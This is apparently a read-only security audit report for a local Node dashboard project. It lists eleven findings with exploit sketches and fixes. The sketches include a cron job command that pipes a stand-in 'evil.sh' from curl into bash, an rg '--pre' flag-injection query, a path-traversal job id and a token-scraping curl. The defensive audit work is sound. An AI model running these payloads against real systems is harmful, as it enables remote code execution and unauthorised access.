# Security Audit — 2026-08 (Phase 0, part 1)

Scope: bearer-token auth on all four servers (`task-server.js`, `cron-manager-server.mjs`,
`memory-api-server.mjs`, `filesystem-api-server.mjs`), path traversal in the filesystem API,
secrets hygiene, and the proxy/loopback-binding claims. Read-only audit; no code changed.
Method: manual source review + static dependency review of `package-lock.json` (no installs).

## Findings

| # | Severity | Location | Issue | Exploit sketch | Recommended fix |
|---|----------|----------|-------|----------------|-----------------|
| F1 | CRITICAL | `task-server.js:975-990` | `/` serves dashboard HTML with `DASHBOARD_AUTH_TOKEN` injected into page source **without any auth check**; static serving is unauthenticated while server binds `0.0.0.0` (`task-server.js:1009`) | `curl http://<host>:3876/ \| grep __DASHBOARD_AUTH_TOKEN__` → full API access from any LAN host | Require a valid token (or one-time bootstrap flow) before serving `/`; never embed the raw token in unauthenticated responses — use an HttpOnly cookie set after token verification |
| F2 | CRITICAL | `cron-manager-server.mjs:186-260` (whole server) | No authentication at all, yet browser-facing: `src/shell/native-views/cron-view.mjs:3` calls `http://127.0.0.1:3878/api/cron-admin` directly; `createJob` accepts arbitrary `command` and `runJob` does `spawn('bash','-c',command)` | Malicious page in local user's browser sends `text/plain` POST (no CORS preflight) to create job `{command:"curl evil.sh\|bash"}` then POST `/run` → drive-by RCE; DNS rebinding also works (no Host validation) | Add bearer-token middleware + strict Origin/Host allowlist; route browser traffic through task-server proxy (pattern already exists in `routes/memory-routes.js`) |
| F3 | HIGH | `cron-manager-server.mjs:95,104,113,130,145` | Job `id` interpolated into `join(CRONTAB_DIR, \`${id}.cron\`)` with no sanitization (only whitespace banned in `createJob`) → path traversal for read/write/delete/run outside crontab dir (runs as root) | `POST /api/cron-admin/jobs {id:"../../../tmp/x", command:"..."}` writes `/tmp/x.cron`; same id form deletes or runs files anywhere | Validate `id` against `/^[A-Za-z0-9._-]+$/` and reject any residual `..`/separator after `basename()` |
| F4 | HIGH | `filesystem-api-server.mjs:591,622-635` | User-controlled search query/path passed as positional `rg` args without `--` separator → rg flag injection; `--pre <cmd>` executes arbitrary shell commands | `GET /api/fs/search?q=--pre&path=touch%20/tmp/pwned` → rg runs `sh -c "touch /tmp/pwned"` as preprocessor | Insert `'--'` before pattern and path args (or `-e <query>`), and pass `--no-pre`/`--no-search-zip` defensively |
| F5 | HIGH | `filesystem-api-server.mjs:794-841` | Standalone FS server has **zero auth** over full CRUD of `/root/.openclaw` (protected-path list is narrow); loopback-only binding is undermined by missing Host-header validation → DNS rebinding turns a browser into a file-read/write client; writing `crontab/*.cron` chains to RCE via cron runner | Rebound page fetches `GET /api/fs/file?path=workspace/crontab/x.cron`, then PUTs attacker command, then triggers run | Require the bearer token (or random secret header) even on loopback; validate `Host` against allowlist |
| F6 | MEDIUM | `memory-api-server.mjs:186,396` | No auth + no Host validation; full CRUD on memory files and facts DB; `PUT /api/memory/file/:name` skips `validateMemoryPath` so any existing file in the dir can be overwritten regardless of extension | DNS-rebound page reads all memory notes and rewrites them silently (data integrity/confidentiality loss) | Add token check + Host allowlist; apply `validateMemoryPath` on every write path |
| F7 | MEDIUM | `task-server.js:701-702` | SSE fallback accepts the bearer token as `?token=` query param → token lands in browser history, proxy/access logs, `Referer` headers | Shared link or reverse-proxy log line captures `?token=<bearer>` | Prefer `Authorization` header or short-lived one-time ticket exchanged for a cookie; if query must stay, log-scrub everywhere and rotate often |
| F8 | MEDIUM | `task-server.js:1004-1008`, `.env.example`, `start-server.sh:10` | `REQUIRE_AUTH=false` escape hatch silently binds an open unauthenticated server on `0.0.0.0`; `start-server.sh` exports `HOST=127.0.0.1` but `task-server.js:1009` hardcodes `0.0.0.0` (script comment/binding claim false); default creds drift (`.env.example` `change-me` vs script `openclaw_password`) | Operator believes loopback-only per startup banner/script; actually LAN-exposed with no token | Honor `HOST` env in `listen()`; make `REQUIRE_AUTH=false` refuse non-loopback bind; unify default password placeholders |
| F9 | LOW | `routes/auth-policy.js:19-24` | Length check before `crypto.timingSafeEqual` leaks token length via timing; acceptable but avoidable | Statistical timing reveals expected-token length | Compare SHA-256 digests of both values instead (fixed 32-byte compare) |
| F10 | LOW | `routes/bing-routes.js:43,61,88,146` | Bing API key sent in outbound URL query string (Bing API design); error paths that log the fetched URL would capture it | Verbose error log prints full request URL incl. `apikey=` | Keep key in header where API allows, or scrub URLs before logging |
| F11 | LOW | `memory-api-server.mjs:searchMemory` | Search query passed as bare positional arg to `openclaw memory search` — leading `-` could be parsed as a CLI flag (limited impact, no exec flags known) | `?q=--deep` alters CLI behavior | Pass `-e <query>` style separators or validate first char |

## Verified-clean areas (explicitly)

- **Path traversal in filesystem API core**: solid. `parseRequestedPath` rejects NUL bytes,
  normalizes POSIX-style, `resolvePath` double-checks containment before *and* after
  `fs.realpath` (symlinks resolved and re-contained), parent realpath checked for
  not-yet-existing targets, rename validates both endpoints. Encoded `%2e%2e` is not decoded
  by Node's HTTP layer and fails at FS level. Windows-vs-POSIX: backslashes normalized to `/`
  — correct for WSL2 deployment.
- **Timing-safe comparison**: `timingSafeTokenEqual` uses `crypto.timingSafeEqual`
  (`routes/auth-policy.js:17-25`); no `==` token compares found in any server.
- **Default-token fallbacks**: none. Missing `DASHBOARD_AUTH_TOKEN` hard-exits unless
  `REQUIRE_AUTH=false` is explicit (see F8 for the foot-gun). `.env.example` contains only
  placeholders. No secrets committed: `state.json` (metrics only), `dashboard-config.json`
  (UI prefs), `models-catalog.json` (model metadata) all clean; repo-wide grep found no
  credential-shaped literals outside test fixtures.
- **Proxy pattern**: `routes/memory-routes.js` proxies 3879 through task-server auth ✓;
  `/api/fs/*` handled in-process under task-server auth ✓. The exception is cron:
  `src/shell/native-views/cron-view.mjs` bypasses the proxy and hits unauthenticated 3878
  directly (F2). Loopback-binding claims are true for 3878/3879/3880 standalone servers but
  **false** for task-server itself (hardcoded `0.0.0.0`, see F8).
- **rg invocation elsewhere** (`memory-api-server.mjs` facts/search): `execFile` array form,
  no shell interpolation.

## Dependency review (`npm audit --omit=dev` equivalent, static)

Lockfile v3, 119 packages. Direct prod deps: `busboy@1.6.0`, `pg@8.20.0`,
`puppeteer@24.42.0`, `puppeteer-core@24.42.0`, `ws@8.20.0`. All current majors; none carry
known advisories at these versions (`ws` ≥ 8.17.1 fixes CVE-2024-37890; `pg` ≥ 8.16 clean).
No risky install/postinstall scripts beyond puppeteer's standard Chrome download. Dev-only
`@playwright/test@1.59.1`. Recommendation stands from roadmap: add `npm audit` to CI for
continuous coverage.

## Prioritized fix plan

### Safe to parallelize later (small, isolated diffs)
1. F3 — cron job id sanitization (one regex helper, ~5 lines).
2. F4 — `--` separator in both `rg` calls (~2 lines each).
3. F9 — digest-based timing-safe compare (contained in `auth-policy.js`).
4. F11 — arg separator for `openclaw memory search`.
5. F10 — Bing key logging hygiene.
6. F6 (partial) — apply `validateMemoryPath` to PUT handler.

### Needs dedicated run (cross-cutting, touches shared request path)
1. F1 — de-tokenize `/`: auth-gated HTML or cookie-based session bootstrap; coordinate with
   `api-client.mjs` token plumbing across ~20 views.
2. F2+F5+F6 — unified "loopback services" auth middleware (shared secret header + Host
   allowlist) applied to cron-manager, filesystem standalone, memory-api; migrate
   `cron-view.mjs` behind the task-server proxy.
3. F7 — replace `?token=` SSE fallback with one-time ticket or cookie.
4. F8 — honor `HOST` env, tighten `REQUIRE_AUTH=false`, fix start-script defaults.
5. Add `npm audit --omit=dev` step to CI workflow.

## Verification performed this run

- `git pull origin main` — tree clean, up to date at `6696196`.
- Manual review of all four servers + `routes/auth-policy.js`, `routes/cron-routes.js`,
  `routes/memory-routes.js`, `routes/sse-routes.js`, `routes/session-routes.js`,
  `routes/settings-routes.js`, `routes/bing-routes.js`, client token usage in `src/shell/`.
- Static dependency review of `package-lock.json`.
- `node scripts/docs-drift-check.js` → exit 0 (0 errors, 10 pre-existing warnings; new root
  `.md` files do not affect it).

*Audit-only run: parallel DB-migration lane active; no code files modified.*
